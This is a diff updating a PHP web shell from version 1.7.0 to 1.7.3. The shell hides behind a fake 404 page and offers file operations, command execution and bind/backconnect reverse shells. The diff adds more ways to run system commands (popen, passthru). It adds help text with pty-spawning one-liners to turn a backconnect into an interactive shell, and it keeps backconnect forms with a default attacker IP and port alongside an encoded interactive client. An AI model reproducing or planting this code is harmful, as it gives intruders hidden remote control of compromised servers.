@@ -10,7 +10,7 @@ if(isset($_GET['l0g1n'])) {
 if(!isset($_SESSION['l0g1n'])) {
  header("Location: http://".$_SERVER['SERVER_NAME']."/404.html");
 }
-$ver="1.7.0"; 
+$ver="1.7.3";
 // --------------------------------------------- globals 
 error_reporting(0);
 @set_time_limit(0);
@@ -21,6 +21,16 @@ $descriptorspec = array(
  1 => array("pipe", "w"),
  2 => array("pipe", "w")
 );
+$helpscript='<script type="text/javascript">function showTooltip(id)
+{
+ var myDiv = document.getElementById(id);
+ if(myDiv.style.display == "none"){
+  myDiv.style.display = "block";
+ } else {
+  myDiv.style.display = "none";
+ }
+ return false;
+}</script>';
 // --------------------------------------------- symbolic permissions 
 function fperms($file)
 {$perms = fileperms($file);if (($perms & 0xC000) == 0xC000) {$info = 's';}
@@ -176,25 +186,25 @@ function search($bin,$flag) {
  } else {
   if (function_enabled('shell_exec')) {
    $path=trim(shell_exec('export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin; which '.$bin.' 2>&1 | grep -v no.'.$bin.'.in'));
-   $perms=trim(shell_exec('stat -c%a '.$path.' 2>&1 | tail -c2'));
   } else if(function_enabled('exec')) {
    $path=trim(exec('export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin; which '.$bin.' 2>&1 | grep -v no.'.$bin.'.in'));
-   $perms=trim(exec('stat -c%a '.$path.' 2>&1 | tail -c2'));
   } else if(function_enabled('system')) {
-   $path=trim(system('export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin; which '.$bin.' 2>&1 | grep -v no.'.$bin.'.in'));
-   $perms=trim(system('stat -c%a '.$path.' 2>&1 | tail -c2'));
+   ob_start();
+   system('export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin; which '.$bin.' 2>&1 | grep -v no.'.$bin.'.in');
+   $path=trim(ob_get_contents());
+   ob_end_clean();
+  } else if (function_enabled('popen')) { 
+   $hndl=popen('export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin; which '.$bin.' 2>&1 | grep -v no.'.$bin.'.in', "r");
+   $path=trim(stream_get_contents($hndl));
+   pclose($hndl);
+  } else if(function_enabled('passthru')) {
+   ob_start();
+   passthru('export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin; which '.$bin.' 2>&1 | grep -v no.'.$bin.'.in');
+   $path=trim(ob_get_contents());
+   ob_end_clean();
   }
  }
- if (is_null($path)) {
-  return $path;
- } else {
-  if ($perms < 5) {
-   $path="perm";
-   return trim($path);
-  } else {
-   return trim($path);
-  }
- }
+ return $path;
 }
 // --------------------------------------------- print page 
 $title='<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
@@ -219,7 +229,7 @@ $title='<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://w
    }
   </style>
  </head>
- <body>
+ <body>'.$helpscript.'
   <b><a href="'.$_SERVER['PHP_SELF'].'?p=f">file operations</a></b> || <b><a href="'.$_SERVER['PHP_SELF'].'?p=s">execute command</a></b> || <b><a href="'.$_SERVER['PHP_SELF'].'?p=b">bind/backconnect</a></b> || <b><a href="'.$_SERVER['PHP_SELF'].'?p=e">extras</a></b><br><br>';
 
 // --------------------------------------------- main code 
@@ -618,6 +628,19 @@ switch ($_GET['p']) {
 // --------------------------------------------- file end; bind
  case "b":
   echo $title;
+  echo '<a href="javascript:;" onclick="showTooltip(1)" id="link"> &gt;&gt; help &lt;&lt; </a>
+  <div id="1" style="background-color: #bbbbbb; color: #000000; position: absolute; border: 1px solid #FF0000; display: none">
+  you could get almost-interactive shell in bind/backconnect with help of these commands<br>
+  -&gt; if there is python on the server, run: <br>
+  python -c \'import pty; pty.spawn("/bin/bash")\'<br>
+  -&gt; ruby:<br>
+  ruby -rpty -e \'PTY.spawn("/bin/bash")do|i,o|Thread.new do loop do o.print STDIN.getc.chr end end;loop do print i.sysread(512);STDOUT.flush end end\'<br>
+  -&gt; expect:<br>
+  expect -c \'spawn sh;interact\'<br>
+  -&gt; policycoreutils package:<br>
+  open_init_pty bash<br><br>
+  //thanks to tex from rdot.org
+  </div><br><br>';
   if ($failflag=="1") {
    echo "fail, at least one system function needed!<br><br>";
   } else {
@@ -670,14 +693,13 @@ switch ($_GET['p']) {
      echo '<br>'.$semi.'</form>';
      echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=b">backconnect to <input name="ip" type="text" maxlength="15" size="15" style="color: green;" value="123.123.123.123">:<input name="port" type="text" maxlength="5" size="5" style="color: green;" value="1337"> saving file to <input name="path" type="text" maxlength="500" size="10" style="color: green;" value="./.bc"> <input type="submit" value="go"><input name="shellz" type="hidden" value="pyremote"><br>'.$nc.'<br></form>';
      echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=b">fully interactive backconnect to <input name="ip" type="text" maxlength="15" size="15" style="color: green;" value="123.123.123.123">:<input name="port" type="text" maxlength="5" size="5" style="color: green;" value="1337"> saving file to <input name="path" type="text" maxlength="500" size="10" style="color: green;" value="./.bc.py"> <input type="submit" value="go"><input name="shellz" type="hidden" value="pyint"><br></form>';
-     if (empty($_POST["downpyint"])) {
-      echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=b"><font color="gray">you need to run special client first: <input type="submit" value="show code"><input name="downpyint" type="hidden" value="downpyint"><br>with this one you will be able to run mc, top, vim, etc</font></form>';
-     } else {
-      echo '<font color="gray"><br>usage: python client.py [host] [port], then input there ^^^^ your host and port.<br>do not remove whitespace!<br>if you see "TERM is not set", run command: export TERM=linux</font><br>';
-      echo "<textarea cols=\"80\" rows=\"20\" style=\"background: black; color: gray;\">";
-      echo gzinflate(base64_decode('dVLBbhoxFLzvV0ypUHcly5BWvaDmEKVEQm1BKhv1sEFou/sAKxsb2U4Ifx8/mySEKAfWsj0zb2bM58G9s4P/Sg9IP2C79xujM3W3NdbDmeaWvMDW7wU8fxx11IQTt3cCxmVqhY50zntZ2/UDCvzAt1GGrVXao3ft6jWN0HeoNsb5BSoWXvTQxyupGi5QZNQ5CkSG4RzO2yPAGQMQPZ0jCB9dfY1X7JRZ0bBMS/68vbhaTqbjUjzv57PLX8t5+Xd88Ye53u7D3HgpQw9tjpxNiDivYES665TznPU7H9FjQ1vPvEPSy1p/8WA+Pt3oXsZ9SUfe1rucC5Tz8udkurya/B5PZ6yw26iOUNp7OlL5Vyuv9BorY0POxtzxxuhQ4KjvpJQ3NlZ35C9w84b9CdRta4tDC7Ju2GBevGrPboNA3yWJ2C8TYr63XmAFdgLEUvG9ZVpyVIij5CrAtckL8T7ZQqCKvyiM8Ad5SwmxYOMUtDU/p3HSUh1aP5U+Gw6HSYQxO6s8vTQ5uy4PA0WUSbAwTBvPB2nAy9t0isLadMZRi8ZoHdIoo0MVCUePKlXFEu8ifej4FPmB59NgyfAT'));
-      echo "</textarea><br>";
-     }
+     echo '<font color="gray">you need to run special client first: <a href="javascript:;" onclick="showTooltip(2)" id="link"> &gt;&gt; show code &lt;&lt; </a><br>with this one you will be able to run mc, top, vim, etc</font>
+     <div id="2" style="background-color: #bbbbbb; color: #000000; position: absolute; border: 1px solid #FF0000; display: none">';
+     echo '<br>usage: python client.py [host] [port], then input there ^^^^ your host and port.<br>do not remove whitespace!<br>if you see "TERM is not set", run command: export TERM=linux<br>';
+     echo "<textarea cols=\"80\" rows=\"20\" style=\"background: black; color: gray;\">";
+     echo gzinflate(base64_decode('dVLBbhoxFLzvV0ypUHcly5BWvaDmEKVEQm1BKhv1sEFou/sAKxsb2U4Ifx8/mySEKAfWsj0zb2bM58G9s4P/Sg9IP2C79xujM3W3NdbDmeaWvMDW7wU8fxx11IQTt3cCxmVqhY50zntZ2/UDCvzAt1GGrVXao3ft6jWN0HeoNsb5BSoWXvTQxyupGi5QZNQ5CkSG4RzO2yPAGQMQPZ0jCB9dfY1X7JRZ0bBMS/68vbhaTqbjUjzv57PLX8t5+Xd88Ye53u7D3HgpQw9tjpxNiDivYES665TznPU7H9FjQ1vPvEPSy1p/8WA+Pt3oXsZ9SUfe1rucC5Tz8udkurya/B5PZ6yw26iOUNp7OlL5Vyuv9BorY0POxtzxxuhQ4KjvpJQ3NlZ35C9w84b9CdRta4tDC7Ju2GBevGrPboNA3yWJ2C8TYr63XmAFdgLEUvG9ZVpyVIij5CrAtckL8T7ZQqCKvyiM8Ad5SwmxYOMUtDU/p3HSUh1aP5U+Gw6HSYQxO6s8vTQ5uy4PA0WUSbAwTBvPB2nAy9t0isLadMZRi8ZoHdIoo0MVCUePKlXFEu8ifej4FPmB59NgyfAT'));
+     echo "</textarea><br>";
+     echo '</div><br><br>';
     }
    }
    //python end
